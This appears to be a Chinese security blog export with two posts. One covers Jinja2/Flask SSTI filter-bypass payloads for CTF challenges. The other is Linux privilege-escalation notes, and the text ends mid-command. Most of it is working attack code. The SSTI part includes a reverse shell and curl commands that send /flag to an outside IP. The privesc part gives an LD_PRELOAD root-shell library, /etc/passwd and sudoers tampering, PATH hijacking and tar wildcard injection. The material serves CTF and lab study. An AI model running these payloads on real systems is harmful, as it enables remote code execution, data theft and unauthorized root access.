输出：_（下划线）得到数字：{{lipsum|string|list|attr('index')('g')}} 相当于lipsum|string|list|attr('index')('g') 输出：10运算出其他数字：{% set shiba=ten%2bten-two %} %2b是URL编码后的加号得到数字：{{dict(a=a)|lower|list|count}}得到16运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind获取__builtins__属性：{{lipsum.__globals__|attr('get')('__builtins__')}} 利用get()、pop()获取属性，相当于lipsum.__globals__.get('__builtins__')lipsum.__globals__.__builtins__ 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')lipsum.__globals__.__builtins__.chr(95) 相当于 lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}利用chr()得到字符：{{chr(47)~chr(32)}} 47是/ 32是空格 ~是连接符利用os执行命令：lipsum.__globals__.os.popen('dir').read() 相当于 lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()类似的 url_for['__globals__']['os']['popen']('dir').read()简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()在能执行eval情况下：eval(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`')) ssti常用过滤器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960attr(): attr用于获取变量(过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器) &quot;&quot;|attr(&quot;__class__&quot;) 相当于 &quot;&quot;.__class__ dict(po=ll,p=abc)|join ：连接键名，拼接得到popint()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：{{ &quot;%s&quot; - &quot;%s&quot;|format('Hello?',&quot;Foo!&quot;) }}将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count ssti_fuzzweb361_(入门ssti)啥都没有过滤,所以可以用很多方法 1234567{{url_for.__globals__.os.popen('cat /flag').read()}}{{url_for.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat /flag').read()&quot;)}}{{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()')}} 123456789101112import requestsurl_base = &quot;http://26ecb42c-4859-430a-8b81-7476a70fba72.challenge.ctf.show?name=&quot;for i in range(500): url = url_base +&quot;{{''.__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]}}&quot; response = requests.get(url=url) if response.status_code == 200: if 'os._wrap_close' in response.text: print(i) break print(i) 1{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(\\&quot;os\\&quot;).popen(&quot;bash -c \\'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1\\'&quot;).read()')}} web362_(数字)可以用全角绕过过滤的数字，也可以使用不用数字的payload 1{{&quot;&quot;.__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}} web363_(‘ “)利用requst.arg绕过 1{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.cmd).read()}}&amp;popen=popen&amp;cmd=cat /flag web364_(‘ “ args)利用request.cookie绕过 123{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}Cookie:popen=popen;cmd=cat /flag web365_([ ])增加过滤了**[ ]**,可以用__getitem()__绕过 123456789().__class__.__mro__.__getitem__(-1){{().__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.cookies.popen)(request.cookies.cmd).read()}} Cookie:cmd=cat /flag;popen=popen============================================================={{url_for.__globals__.os.popen(request.cookies.cmd).read()}}Cookie:cmd=cat /flag web366_(下划线)利用attr过滤器绕过 1234{{lipsum.__globals__.os.popen('ls').read()}}{{(lipsum|attr(request.cookies.globals)).os.popen(reqeuest.cookies.cmd).read()}}Cookie:cmd=cat /flag;globals=__globals__ web367_(os)过滤了字符os，那就把os写到request里面就行了 12345x.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;){{(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem))(request.cookies.builtins).eval(request.cookies.cmd)}}Cookie:init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;cmd=__import__('os').popen('cat /flag').read() web368_(大括号)过滤了{{,}},可以用{% %} 使用request.values.x，values可以接受GET和POST形式的传参,注意get(request.values.b)中的get根据你的传参方式来的 1234{% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&amp;a=__globals__&amp;b=os&amp;c=cat /flag web369_(request)过滤了request,利用dict()|join拼接我们需要的字符 12345678910{% set po=dict(po=a,p=a)|join%} # dict()|join 拼接键名的方式，此处得到变量po=pop{% set a=(()|select|string|list)|attr(po)(24)%} #通过pop(24)选择到“_”下划线并赋值给a{% set ini=(a,a,dict(init=a)|join,a,a)|join()%} #ini=__init__{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} #glo=__globals__{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} #geti=__getitem__{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} #built=__builtins__{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} #x=q.__init__.__globals__.__getitem__('__builtins__'){% set chr=x.chr%} #chr=x.chr 选择到了chr函数，chr=&lt;built-in function chr&gt;{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%} #结合ASCII和chr函数构造。file=/flag{%print(x.open(file).read())%} #利用open函数读取 web370_(0-9)将上一题的数字用全角替换 12345678910{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%} {% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}{%print(x.open(file).read())%} 也可以用count或者length 123456789101112131415{% set two=(dict(aa=a)|join|count)%}{% set three=(dict(aaa=a)|join|count)%}{% set four=(dict(aaaa=a)|join|count)%}{% set seven=(dict(aaaaaaa=a)|join|count)%}{% set eight=(dict(aaaaaaaa=a)|join|count)%}{% set nine=(dict(aaaaaaaaa=a)|join|count)%}{% set ten=(dict(aaaaaaaaaa=a)|join|count)%}{% set twofour=( two~four)|int%}{% set a=(()|select|string|list).pop(twofour)%}{% set globals=(a,a,dict(globals=s)|join,a,a)|join%}{% set init=(a,a,dict(init=v)|join,a,a)|join%}{% set builtins=(a,a,dict(builtins=c)|join,a,a)|join%}{% set a=(lipsum|attr(globals)).get(builtins)%}{% set chr=a.chr%}{% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%} web371_(print)过滤了print，将flag内容发送到vps 1234567891011s='__import__(&quot;os&quot;).popen(&quot;curl http://81.71.13.76:5555?p=`cat /flag`&quot;).read()'def fun(s): t='' for i in range(len(s)): if i&lt;len(s)-1: t+='chr('+(str(ord(s[i])))+')%2b' else: t+='chr('+(str(ord(s[i])))+')' return tprint(fun(s))#再将数字转成全角 1234567891011121314{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%}{% set cmd=chr(９５)%2bchr(９５)%2bchr(１０５)%2bchr(１０９)%2bchr(１１２)%2bchr(１１１)%2bchr(１１４)%2bchr(１１６)%2bchr(９５)%2bchr(９５)%2bchr(４０)%2bchr(３４)%2bchr(１１１)%2bchr(１１５)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１２)%2bchr(１１１)%2bchr(１１２)%2bchr(１０１)%2bchr(１１０)%2bchr(４０)%2bchr(３４)%2bchr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５６)%2bchr(４９)%2bchr(４６)%2bchr(５５)%2bchr(４９)%2bchr(４６)%2bchr(４９)%2bchr(５１)%2bchr(４６)%2bchr(５５)%2bchr(５４)%2bchr(５８)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(６３)%2bchr(１１２)%2bchr(６１)%2bchr(９６)%2bchr(９９)%2bchr(９７)%2bchr(１１６)%2bchr(３２)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(９６)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１４)%2bchr(１０１)%2bchr(９７)%2bchr(１００)%2bchr(４０)%2bchr(４１)%}{%if x.eval(cmd)%}abc{%endif%} web372_(count)用上一题的将数字变成全角的payload照样可以， 补充baby flask12345'.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9' 这道题的特点是过滤了数字和cont和length，怎么得到数字呢？ 123456789101112131415161718{% set test=(()|select|string|list)%}{% print(test) %}输出如下：['&lt;', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', '5', 'c', '7', 'b', '5', 'b', '9', 'b', 'a', '0', '&gt;']{% set test=(()|select|string|list).index('e')%}{% print(test) %}输出如下：2为什么是2呢？其实index('e')就是表示e在列表中的索引，问题又来了，想要得到值100或1000，想要得到更大的值怎么办呢，可以用运算符号比如输出如下{% set test=(()|select|string|list).index('e')%}{% print(test*test) %}输出如下：4 贴一下wp 12345678910111213141516171819202122{% set id=dict(ind=a,ex=a)|join%}{% set pp=dict(po=a,p=a)|join%}{% set ls=dict(ls=a)|join%}{% set ppe=dict(po=a,pen=a)|join%}{% set gt=dict(ge=a,t=a)|join%}{% set cr=dict(ch=a,r=a)|join%}{% set nn=dict(n=a)|join%}{% set tt=dict(t=a)|join%}{% set ff=dict(f=a)|join%}{% set ooqq=dict(o=a,s=a)|join %}{% set rd=dict(re=a,ad=a)|join%}{% set five=(lipsum|string|list)|attr(id)(tt) %}{% set three=(lipsum|string|list)|attr(id)(nn) %}{% set one=(lipsum|string|list)|attr(id)(ff) %}{% set shiba=five*five-three-three-one %}{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}{% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}{% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}{% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}{% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}{% set space=chcr(three*three*five-five-five-three) %}{% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}","link":"/2023/11/10/SSTI%E6%BC%8F%E6%B4%9E/"},{"title":"Linux提权总结","text":"前言记录一些常见的非漏洞(配置不当)提权笔记；还有一些linux内核版本可能会产生漏洞需要自行google. suid提权 只对可执行文件生效，任何用户执行该文件都是以文件所属者身份运行的。 SUID（Set User ID）是一种权限位，用于在执行文件时暂时将进程的有效用户 ID 更改为文件所有者的用户 ID。它是一种特殊权限设置，可让非特权用户以超级用户权限运行具有 SUID 标志的可执行文件。 查找具有s权限的二进制文件 1find / -perm -u=s -type f 2&gt;/dev/null find做一个实验使得find命令有s权限，来提权、 12345678910111213141516171819202122┌──(kali㉿kali)-[~]└─$ whoamikali┌──(kali㉿kali)-[~]└─$ which find/usr/bin/find┌──(kali㉿kali)-[~]└─$ ls -l /usr/bin/find-rwxr-xr-x 1 root root 224848 7月 2日 13:26 /usr/bin/find┌──(kali㉿kali)-[~]└─$ sudo chmod u+s /usr/bin/find┌──(kali㉿kali)-[~]└─$ ls -l /usr/bin/find-rwsr-xr-x 1 root root 224848 7月 2日 13:26 /usr/bin/find#由rwx变成了rws┌──(kali㉿kali)-[~]└─$ find /etc/passwd -exec &quot;whoami&quot; \\;root cp做一个实验使得cp命令有s权限，来提权、当然不止于find,cp命令，可以参考这个网址：click me 当cp有suid权限时，可以改写只能root访问的文件，比如/etc/passwd或/etc/shadow中的内容 首先用openssl生成一个密码，passwd参数表示生成一个密码，-1表示md5,-salk表示盐(随意指定)，最后跟要加密的值 12└─$ openssl passwd -1 -salt 1 123abc $1$1$dzqAUU/vB2clNL4EHnbXq0 然后往/etc/passwd文件中添加一个新用户，用户名随意取，密码不要用x,要用我们上面生成的密码，其他的按照root的写即可 123456789101112131415161718┌──(kali㉿kali)-[~/桌面]└─$ sudo chmod u+s /usr/bin/cp ┌──(kali㉿kali)-[~/桌面]└─$ ls -l /usr/bin/cp -rwsr-xr-x 1 root root 151152 2022年 9月20日 /usr/bin/cp ┌──(kali㉿kali)-[~/桌面]└─$ cp /etc/passwd ./ ┌──(kali㉿kali)-[~/桌面]└─$ vim passwd #在最后添加一行:test:$1$1$dzqAUU/vB2clNL4EHnbXq0:0:0:root:/root:/usr/bin/zsh┌──(kali㉿kali)-[~/桌面]└─$ cp ./passwd /etc/passwd ┌──(kali㉿kali)-[~/桌面]└─$ su test 密码： #这里输入之前openssl加密的 '123abc'┌──(root㉿kali)-[/home/kali/桌面]└─# #提权成功 去修改/etc/sudoers应该简单点 补充一下linux的shadow文件中的第二个字段保存了加密后的密码，加密数据的格式为 $type$salt$encrypted，其中type是提示符，salt是随机生成的字符串，encrypted是明文密码和salt通过crypt函数加密后的结果。在加密数据中的提示符type用来标识采用了哪种加密方式，这样的标识符有以下几种： 1 代表采用了MD5加密方式2 Blowfish，是最早的版本，有一些缺陷，不推荐使用2a Blowfish，是修复了一些缺陷后的版本，但仍然有一些问题，不推荐使用2b Blowfish，是修复了2a中的问题后的版本，是安全、常用的版本2y Blowfish，Eksblowfish版本y 是Yescrypt加密方式的前缀，是Blowfish加密方式的一个变种，提供了更高的安全性和性能5 代表采用了SHA256加密方式6 代表采用了SHA512加密方式 在线哈希识别器：click me /etc/shadow中的密码可以用john工具(kali自带)破解，能不能破解成功取决于你的dict。 123456789101112131415161718192021222324252627┌──(kali㉿kali)-[~/桌面]└─$ echo &quot;\\$1\\$1\\$dzqAUU/vB2clNL4EHnbXq0&quot; &gt; hash┌──(kali㉿kali)-[~/桌面]└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txtWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status123abc (?) #这里成功破解出密码为'123abc'1g 0:00:00:00 DONE (2023-12-05 12:53) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. #这里需要说明一下，john不会破解之前已经破解过的密文，可以使用命令查看之前破解的密文方法一┌──(kali㉿kali)-[~/桌面]└─$ cat /home/kali/.john/john.pot$1$1$dzqAUU/vB2clNL4EHnbXq0:123abc方法二┌──(kali㉿kali)-[~/桌面]└─$ john --show hash ?:123abc 当然john还有很多用法,比如破解受密码保护的Zip压缩文件，我不一一记录; 可以参考 官方Wiki 再docker中su username,可能会报must be run from terminal;解决方案：clink me 用的比较多的解决方案： 1python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot; sudo提权sudo提权基本离不开/etc/sudoers文件， /etc/sudoers文件是一个用于配置sudo命令的文件，它定义了哪些用户或用户组有权利以root用户的权限来执行特定的命令。这个文件通常位于Linux系统中的/etc目录下。sudoers文件的内容可以指定哪些用户可以以root用户的权限执行哪些命令，以及是否需要输入密码等安全设置。编辑sudoers文件需要特殊的权限，并且通常使用visudo命令来进行编辑，以确保在保存文件时能够检查语法错误，以避免导致系统安全性问题。 假如我们（root用户）要给普通用户test分配sudo权限，请输出vim /etc/sudoers打开文件进行编辑，找到root权限root ALL=(ALL:ALL) ALL，在下一行输入test ALL(ALL:ALL) NOPASSWD:ALL，保存后退出，这样即表示用户test可以使用sudo调用root权限执行命令。 /etc/sudoers也可以指定用户执行指定的sudo命令 test ALL(ALL:ALL) /usr/bin/ls,但是这样还是得输入密码才能执行，也可以配置不需要密码：test ALL(ALL:ALL) NOPASSWD:/usr/bin/ls, 在Vim中，当你输入:!/bin/bash并按下回车时，Vim会执行你输入的命令，其中!表示执行外部命令的意思。因此，Vim会启动一个新的shell进程并执行/bin/bash。这是Vim的一个功能，允许用户在编辑器中执行外部命令,当然vim，只是sudo提权命令之一，还有很多其他的命令，比如：less,python等等，可以参考上面那个网站 12345678910111213141516171819202122232425262728293031┌──(kali㉿kali)-[~/桌面]└─$ sudo vim /etc/sudoers#添加zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/less# wp!保存退出┌──(zixyd㉿kali)-[/home/kali/桌面]└─$ sudo -ll匹配 kali 上 zixyd 的默认条目： env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty用户 zixyd 可以在 kali 上运行以下命令：Sudoers 条目： RunAs 用户：ALL RunAs 组：ALL 选项：!authenticate 命令： /usr/bin/less#切换到zixyd用户┌──(zixyd㉿kali)-[/home/kali/桌面]└─$ sudo less /etc/passwd#直接输入!/bin/bash#提权成功┌──(root㉿kali)-[/home/kali/桌面]└─# 再试试python,在/etc/sudoers中添加zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/less,/usr/bin/python, 12345┌──(zixyd㉿kali)-[/home/kali/桌面]└─$ sudo python -c &quot;import os;os.system('/bin/sh')&quot;# whoami root NFS提权NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。 首先安装nfs服务端： 1sudo apt-get install nfs-kernel-server 安装后修改配置文件/etc/exports，这里将home目录进行挂载共享，内容如下： 1/home *(rw,no_root_squash) 其中/home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。 随后重启相关服务： 123# nfs通过rpc通信，这里把rpcbind也重启下sudo /etc/init.d/rpcbind restartsudo /etc/init.d/nfs-kernel-server restart 此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。 1showmount -e ip NFS配置不当可提权 当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下： 首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。 此时目标机的home目录下就会有一个具有suid权限的bash。 普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。 p参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承euid，因为bash有suid权限，所以这里是root。 使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。 其它命令 除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。 例如nano被共享了，则可以给nano一个suid权限，然后来读取敏感文件，爆破密码从而登录。 PATH提权Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。 首先编译以下c代码，这里用whoami命令来做实验,gcc shell.c -o whoami_shell 123456789#include&lt;unistd.h&gt;#include&lt;stdlib.h&gt;int main(){ setuid(0); setgid(0); system(&quot;whoami&quot;); return 0;} 12345678910111213141516171819202122┌──(kali㉿kali)-[~/桌面]└─$ gcc ./shell.c -o whoami_shell ┌──(kali㉿kali)-[~/桌面]└─$ ls -l ./whoami_shell-rwxr-xr-x 1 kali kali 16056 12月 7日 19:19 ./whoami_shell┌──(kali㉿kali)-[~/桌面]└─$ ./whoami_shell kali┌──(kali㉿kali)-[~/桌面]└─$ sudo chown root ./whoami_shell #改变所有者为root ┌──(kali㉿kali)-[~/桌面]└─$ ll whoami_shell -rwxr-xr-x 1 root kali 16056 12月 7日 19:19 whoami_shell┌──(kali㉿kali)-[~/桌面]└─$ sudo chmod u+s ./whoami_shell ┌──(kali㉿kali)-[~/桌面]└─$ ./whoami_shellroot 利用：到tmp目录下，把bash写到一个whoami文件中，然后修改PATH变量添加tmp目录，再去执行shell，就会获得一个root权限。 1234567891011121314151617181920212223242526272829┌──(kali㉿kali)-[~/桌面]└─$ cd /tmp ┌──(kali㉿kali)-[/tmp]└─$ echo &quot;/bin/bash&quot; &gt; whoami┌──(kali㉿kali)-[/tmp]└─$ ls whoami┌──(kali㉿kali)-[/tmp]└─$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/bin┌──(kali㉿kali)-[/tmp]└─$ export PATH=/tmp:$PATH┌──(kali㉿kali)-[/tmp]└─$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/bin┌──(kali㉿kali)-[~/桌面]└─$ chmod +x /tmp/whoami #还要给可执行权限┌──(kali㉿kali)-[~/桌面]└─$ ./whoami_shell ┌──(root㉿kali)-[~/桌面]└─# 过程：root给一个可执行文件赋予了suid，而此文件又调用了一个环境变量的命令，这时修改PATH把tmp添加到头的位置，系统再执行就会先去tmp目录下找，tmp目录下放的是恶意程序，从而导致恶意程序以root权限运行。 注意，用export PATH=/tmp:$PATH改变PATH只在此次终端才有效，对其他终端无效 LD_PRELOAD提权LD_PRELOAD是Linux下的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态连接库。 测试前先按如下配置一下sudoers文件，以zixyd用户为例，添加一个find命令和一个LD_PRELOAD。 123zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/findDefaults env_keep += LD_PRELOAD 这里记录下env_keep的说明。 例如aaa用户有一个aaa_pach的环境变量，当通过su切换到bbb用户时，再查看env环境变量，aaa_pach就没有了，也就意味着用户的切换不会带着环境变量一块切过去。而想保持某个环境不受用户切换的影响，那么可以在sudoers文件中设置env_keep。 如果并设置Defaults env_keep += LD_PRELOAD,会报错 123┌──(zixyd㉿kali)-[~]└─$ sudo LD_PRELOAD=ld_preload_shell_test find sudo: 对不起，您无权设置以下环境变量：LD_PRELOAD 切换回普通用户，查看sudo权限。 1234567┌──(zixyd㉿kali)-[~]└─$ sudo -l 匹配 kali 上 zixyd 的默认条目： env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=LD_PRELOAD, use_pty用户 zixyd 可以在 kali 上运行以下命令： (ALL : ALL) NOPASSWD: /usr/bin/find 我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权。 so文件的c代码如下。 12345678910#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;);} 然后进行编译-fPIC -shared参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。 1gcc ld_preload_shell.c -fPIC -shared -o shell.so -nostartfiles 编译后我们使用sudo运行find并指定LD_PRELOAD为我们编译的shell.so文件，这时find就会先调用shell.so，导致我们的代码被执行，返回的权限为root。 1234┌──(zixyd㉿kali)-[~]└─$ sudo LD_PRELOAD=/home/zixyd/shell.so find #似乎只能用绝对路径，系统默认的共享库目录（比如/lib和/usr/lib） ┌──(root㉿kali)-[/home/zixyd]└─# 思考： 再sudo提权时可以用到LD_PRELOAD，那么suid行不行呢？我用suid没有成功 123456789┌──(zixyd㉿kali)-[~]└─$ ll /usr/bin/cp-rwsr-xr-x 1 root root 151152 2022年 9月20日 /usr/bin/cp┌──(zixyd㉿kali)-[~]└─$ LD_PRELOAD=/home/zixyd/shell.so cp /etc/passwd ./┌──(zixyd㉿kali)-[~] #并没有切换到root└─$ 注意点：如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。 总结 使用情况就是sudoers中的env_keep定义了LD_PRELOAD，然后sudo有相关的命令，那么sudo运行命令时就可以通过LD_PRELOAD来指定恶意so文件。 cronjobs提权cronjobs是定时任务，在特定的日期和时间执行计划任务。例如定期备份或者定期清理某个目录等都会用到，定义格式如下： 文件覆盖这里以root用户创建一下测试环境，首先创建一个cron，运行一个脚本，该脚本功能是定时清除特定文件，例如/tmp/test。 12┌──(kali㉿kali)-[~/桌面]└─$ echo &quot;just_test&quot; &gt; /tmp/test 创建clear.py脚本，并赋可执行权限chmod +x /tmp/clear.py 12345678#!/usr/bin/env python3import osimport systry: os.system(&quot;rm -rf /tmp/test&quot;)except: sys.exit() 修改crontab 文件，每分钟以root身份执行一次/tmp/clear.py文件 123sudo vim /etc/crontab */1 * * * * root /tmp/clear.py 提权： 如果可以修改定时任务的文件(clear.py)，就可以提权，例如将上面的**/tmp/clear.py**修改内容如下 123456789#!/usr/bin/env python3import osimport systry: os.system(&quot;rm -rf /tmp/test&quot;) os.system(&quot;chmod u+s /bin/bash&quot;)except: sys.exit() 在执行/bin/bash -p命令即可得到root权限，-p参数在本文章上面有解释； 通配符注入而在操作过程中，如果有文件名的名字是一个参数，那么执行过程中，就会被当作参数运行。例如一个目录下有一个叫–help的文件，当cat查看该文件内容时，实际上确是cat的帮助信息。 常见的定时任务除了定时清除文件外，定时压缩也会很常见，例如有一个定时任务，每分钟回去执行/var/www/html/crontab.sh脚本，该脚本是备份html网站，脚本内容如下。 123#!/bin/bashcd /var/www/html/tar -zvcf /var/backups/html.tar * 修改/etc/crontab： 1*/1 * * * * root /var/www/html/crontab.sh 查看是否备份成功 1234567┌──(kali㉿kali)-[/var/backups]└─$ cd /var/backups ┌──(kali㉿kali)-[/var/backups]└─$ ll总计 4-rw-r--r-- 1 root root 3621 12月 8日 09:52 html.tar 在tar命令中有一个checkpoint参数，即检查点，比如checkpoint=1，则代表压缩过程中每压缩一个文件就去执行一个检查操作。 而这个检查操作的参数是--checkpoint-action=exec=，后面可以跟要执行的命令。 利用思路就是我们写入一个sh脚本，该脚本作用是修改sudoers文件，把当前用户添加进去，获得sudo所有权，从而进行提权。然后利用checkpoint-action=exec=接一个执行sh脚本的命令即可。 利用过程：首先创建两个文件，名字为参数名，然后再创建一个sh脚本，内容为向sudoers追加权限，相关命令如下： 123echo 'echo &quot;zixyd ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers' &gt; test.shecho 